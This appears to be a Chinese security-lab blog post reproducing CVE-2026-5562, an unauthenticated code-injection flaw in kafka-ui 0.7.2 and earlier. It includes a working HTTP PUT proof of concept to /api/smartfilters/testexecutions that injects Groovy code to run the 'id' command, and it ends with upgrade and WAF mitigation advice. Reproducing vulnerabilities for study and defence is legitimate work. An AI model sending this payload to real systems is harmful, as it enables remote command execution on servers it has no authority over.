---
cve: "CVE-2026-5562"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【成功复现】KafkaUI代码执行漏洞(CVE-2026-5562)  
原创 弥天安全实验室
                    弥天安全实验室  弥天安全实验室   2026-09-09 11:19  
  
#   
  
网安引领时代，弥天点亮未来    
   
  
  
  
  
  
   
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=2jntd263&tp=webp#imgIndex=0 "")  
  
  
**0x00写在前面**  
  
**本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！**  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x01漏洞介绍**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaTR5C0s9icySBtWtiaOG6FZ3MHsUWUnFHQkck46AyT2ictoCfb7X17YEvMAWDnGgEbJETmwExonQVXqSBBxibg4micVpE0g2TyTvXw/640?wx_fmt=png&from=appmsg "")  
  
  
Provectus kafka-ui是Provectus公司开源的一个Kafka的Web管理界面。  
  
kafka-ui 0.7.2及之前版本存在代码注入漏洞，该漏洞源于端点/api/smartfilters/testexecutions中validateAccess函数存在代码注入。  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x02影响版本**  
  
  
kafka-ui 0.7.2及之前版本 【漏洞成因接口未授权，传参未过滤】  
  
  
**利用条件：**  
  
网络可达  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaWArBQakx9cUOura9oDgkh2ks8kT4ozQrSKm3Vt5yafC3lLCL9xfSaB2Hd7LZK4lMvhFtM2nPpuI51zqnrZFERbt7wibib0ny14/640?wx_fmt=png&from=appmsg "")  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=7c3v7kvq&tp=webp#imgIndex=1 "")  
  
  
**0x01漏洞复现**  
  
  
1.访问环境  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGiaee0IjiaOw6zVbHn9NQgFtLJ0K33GGzTSrTiabLLp29F702q1WrLaq2xRhZGLCdZjOsJ3lStVIEh2NKjIM1UHxkOib2ll50pVDp4/640?wx_fmt=png&from=appmsg "")  
  
2.漏洞利用  
  
poc  
```
PUT /api/smartfilters/testexecutions HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Length: 160
Connection: close
Content-Type: application/json
Accept-Encoding: gzip

{
    "filterCode":"throw new Exception(\"id\".execute().text)",
    "key":"k",
    "value":"v",
    "offset":0,
    "partition":0,
    "timestampMs":0
}
```  
  
漏洞测试，成功执行id命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGjFGc2pzU15cL47xs3atsq7vn3P6cJbNXiaEZm76wm4tunzcD3McDqS6KBD2vIAdRpic1wfKgjGibiawPolwKicwAibZDjsQOkVWwDh0/640?wx_fmt=png&from=appmsg "")  
  
3.弥天安全实验室漏洞库【已验证】  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YfTkN0R6oGia4XIGrM0KdwvibetfcicsbKY9RPaISicFu9j03sG04TSk9l9udFsd1PvrvO6mibE3jRO6lwS4yEWged1oVscSgwNSaI84GUD6KTUk/640?wx_fmt=png&from=appmsg "")  
  
![Image](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hDCVZx96ZMibcJI8GEwNnAyx4yiavy2qelCaTeSAibEeFrVtpyibBCicjbzwDkmBJDj9xBWJ6ff10OTQ2w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=bzequ3sx&tp=webp#imgIndex=3 "")  
  
  
**0x04修复建议**  
  
  
目前厂商已发布升级补丁以修复漏洞，补丁获取链接：  
  
临时缓解措施：  
  
安全防御设备WAF、IPS、防火墙等阻断攻击行为。  
  
  
建议尽快升级修复漏洞，再次声明本文仅供学习使用，非法他用责任自负！     
```
https://github.com/provectus/kafka-ui/releases
```  
  
  
技术交流群  
 ➕VX：xyzy0720  
  
  
弥天简介  
  
学海浩茫，予以风动，必降弥天之润！弥天安全实验室成立于2019年2月19日，主要研究安全防守溯源、威胁狩猎、漏洞复现、工具分享等不同领域。目前主要力量为民间白帽子，也是民间组织。主要以技术共享、交流等不断赋能自己，赋能安全圈，为网络安全发展贡献自己的微薄之力。  
  
口号 网安引领时代，弥天点亮未来  
  
  
  
![Image](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&randomid=h6lqq1ue&tp=webp#imgIndex=8 "")  
  
   
  
  
知识分享完了  
  
喜欢别忘了关注我们哦~  
  
学海浩茫，  
  
予以风动，  
  
必降弥天之润！  
  
  
   弥  天  
  
安全实验室  
  
![Image](https://mmbiz.qpic.cn/mmbiz_jpg/MjmKb3ap0hDyTJAqicycpl7ZakwfehdOgvOqd7bOUjVTdwxpfudPLOJcLiaSZnMC7pDDdlIF4TWBWWYnD04wX7uA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&randomid=u34b870m&tp=webp#imgIndex=9 "")  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
